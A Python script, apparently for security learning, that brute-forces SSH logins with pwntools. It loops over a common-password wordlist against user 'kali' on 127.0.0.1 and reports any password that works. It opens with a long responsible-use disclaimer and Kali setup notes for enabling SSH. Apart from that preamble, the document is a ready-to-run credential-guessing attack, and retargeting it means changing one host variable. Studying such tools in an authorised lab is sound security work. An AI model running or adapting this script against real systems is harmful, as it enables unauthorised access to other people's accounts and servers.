# ####################################################################################
#
# SSH Login Brute Force
#
# ####################################################################################
#
# Disclaimer: SSH Login Brute Force Script
#
# This script is provided for educational and testing purposes only. It is intended to be used responsibly and legally, solely on your own machine or on systems for which you have obtained explicit, written authorization from the system owner or administrator.
#
# Usage Guidelines:
#
# Responsible Use: Please use this script in a responsible and ethical manner. Unauthorized access to computer systems, networks, or devices is illegal and unethical.
# Authorized Access: Before using this script on any system that you do not own or administer, ensure you have obtained written authorization from the system owner or authorized personnel. Unauthorized access is a violation of privacy and may result in legal consequences.
# Educational Purposes: This script is intended for educational purposes to understand security vulnerabilities and should not be used maliciously.
# Legal Compliance: Comply with all applicable laws and regulations regarding computer security and data privacy in your jurisdiction.
# By using this script, you acknowledge and agree to abide by these guidelines and accept full responsibility for any consequences resulting from its use.
#
# The creator of this script and any affiliated parties shall not be held liable for any misuse, damage, or legal actions resulting from the use of this script in violation of these guidelines.
#
# Please note that even with a disclaimer, the use of such a script may still be illegal or unethical in certain situations, so always exercise caution and adhere to legal and ethical standards. It's essential to respect privacy and obtain proper authorization when testing or using security tools like this.
#
# ####################################################################################
#
# In order for this to work on my Kali machine I had to take some additional steps
#
# ####################################################################################
#
# Kali by default does not have SSH enabled. These are the steps I took
#
# Note some of these steps required sudo
#
# sudo apt-get install ssh
# update-rc.d -f ssh remove
# update-rc.d -f ssh defaults
# cd /etc/ssh/
# mkdir insecure_original_default_kali_keys
# mv ssh_host_* insecure_original_default_kali_keys/
# dpkg-reconfigure openssh-server
# sudo service ssh start
#
# To turn SSH off use the following command:
# sudo service ssh stop
#
# ####################################################################################
#
# pwntools is required for this script to work
#
# pip install pwntools
#
# ####################################################################################
#
# More information about pwntools & ssh can be found here:
# https://docs.pwntools.com/en/stable/tubes/ssh.html
#
# ####################################################################################

from pwn import *
import paramiko

# Target IP Address
host = "127.0.0.1"
# Username of Target IP
username = "kali"
# Attempts Count
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host,user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1
